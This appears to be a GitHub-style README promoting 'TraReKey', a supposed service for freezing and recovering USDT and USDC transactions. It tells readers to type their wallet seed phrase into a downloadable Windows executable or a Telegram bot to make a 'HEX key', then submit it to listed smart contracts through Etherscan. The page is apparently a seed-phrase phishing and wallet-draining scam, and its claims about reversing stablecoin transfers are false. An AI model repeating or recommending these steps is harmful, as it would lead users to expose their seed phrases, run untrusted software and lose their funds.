![logo](./assets/logo.png)
# TraReKey.org

## Overview
**TraReKey.org** is a comprehensive solution designed to enhance the security and usability of blockchain assets by offering mechanisms for freezing and recovering USDT and USDC tokens. It integrates advanced smart contract functionalities to support anti-money laundering (AML) policies, ensuring compliance with legal regulations and safeguarding users against fraudulent activities.

<img src="./assets/tokens.png" alt="tokens" width="70px">
---

## Downloads Github
- **Standalone Windows Version**:
  - [TraReKey_0.1.0_x64.exe (11 MB)](./windows/downloads/)
  - [TraReKey_0.1.0_x64_en-US.msi (5 MB)](./windows/downloads/)

## Downloads From Site
- **Standalone Windows Version**:
  - [TraReKey_0.1.0_x64.exe (11 MB)](https://trarekey.org/download/TraReKey_0.1.0_x64.exe)
  - [TraReKey_0.1.0_x64_en-US.msi (5 MB)](https://trarekey.org/download/Trarekey_Generator_0.1.0_x64_en-US.msi)
---

## Key Features
### **Freezing and Recovery Mechanism**
TraReKey facilitates the freezing and recovery of USDT and USDC tokens in case of:
- Suspicious activity.
- Transactional errors.

### **Benefits**
- **Fast Response**: Immediate freezing of suspicious transactions.
- **Abuse Prevention**: 24-hour delay for validation.
- **Transparency**: All actions are recorded on the blockchain.

---

## How to Initiate the Token Freezing and Recovery Process
### 1. **Submitting a Request**
- **Via Specialized Interface**: Use the user-friendly platform.
- **Directly on Blockchain**: Interact with the smart contract using tools like Web3 libraries or Etherscan.
  - Required details:
    - **Transaction Hash (TxHash):** Identifier of the transaction.
    - **HEX Key (TraReKey):** Cryptographic signature verifying the requestor.
  - Signature must originate from the wallet associated with the erroneous transaction.

### 2. **Initial Freezing**
The appeal smart contract instantly freezes funds tied to the transaction.

### 3. **AI-Driven Analysis**
An AI module evaluates:
- **Interaction History**: Prior wallet activities.
- **Behavioral Patterns**: Deviations from usual behavior.
- **Transaction Metadata**: Indicators of suspicious activity.

### 4. **Temporary Delay**
A 24-hour delay ensures:
- Further evidence collection.
- External agency validation (if required).

### 5. **Fund Recovery**
Upon validation, frozen funds are returned to the sender’s wallet.

---

## What is TraReKey (HEX Key)?
**TraReKey** is a unique cryptographic identifier generated from the user's seed phrase. It ensures secure verification for token freezing and recovery operations.

### **Generation Methods**
1. **Local Application**: Use the [TraReKey Generator(Windows)](https://trarekey.org/download/TraReKey_0.1.0_x64.exe) for secure, offline generation.
2. **Web-Based or [Telegram Bot](https://t.me/TrarekeyBot)**: Less secure; use cautiously.

### **Process**
1. **Select Blockchain & Token**.
2. **Input Seed Phrase**.
3. **Execute Hashing Algorithm** to create the HEX Key.

### **Security Features**
- **Irreversible Hashing**: Prevents retrieval of the seed phrase.
- **Confidentiality**: Seed phrase remains private.
- **Unique and Non-Replicable**: Tied exclusively to the user’s wallet address.

---

 

## Links and functions for manual entry of the Trarekey

| Network & Token                                      | Function                                    |
|-----------------------------------------------------|---------------------------------------------|
| [USDT (Ethereum Mainnet)](https://etherscan.io/address/0xB264fec117E1b8D63813B0E43e00c051cd2B98ed#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
| [USDC (Ethereum Mainnet)](https://etherscan.io/address/0xa23EC1689AF0d2B9CF0DAC67C4894Ecd1A3A9185#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
| [USDT (BNB Smart Chain)](https://bscscan.com/address/0xdc1FAFE24dd24151a64e72A74B8bA1Bd6C775444#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
| [USDC (BNB Smart Chain)](https://bscscan.com/address/0xb4e25FCa9D90b5D16c52bbe3d64909185aA3ec77#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
| [USDC (Base Mainnet)](https://basescan.org/address/0xb4e25FCa9D90b5D16c52bbe3d64909185aA3ec77#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |




## Manual Token Freezing and Recovery
### Supported Networks & Tokens



![Manual](./assets/manual.gif)

### Using MetaMask and Etherscan
1. **Set Up MetaMask**:
   - Ensure sufficient ETH/BNB for gas fees.
   - Switch to the correct network.
2. **Access Contract**:
   - Open the contract on Etherscan.
   - Connect MetaMask via Web3.
3. **Enter Data**:
   - Provide TxHash and HEX Key.
   - Confirm transaction details.
4. **Submit**:
   - Click "Write" to execute the function.
5. **Verify**:
   - Check request status within 24 hours.

---

## Troubleshooting
### Common Issues
- **Insufficient Gas**: Ensure adequate ETH/BNB balance.
- **Invalid HEX Key**: Verify token and network selection.
- **Submission Error**: Recheck wallet and TraReKey details.

---

## Additional Information
- Priority is given to large transactions.
- Freezing and recovery are only possible if tokens remain in the recipient’s wallet.

For more details and documentation, visit [TraReKey.org](https://trarekey.org).

---

## License
This project is licensed under the MIT License. See the LICENSE file for details.

---

## Contributing
We welcome contributions! Please read our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
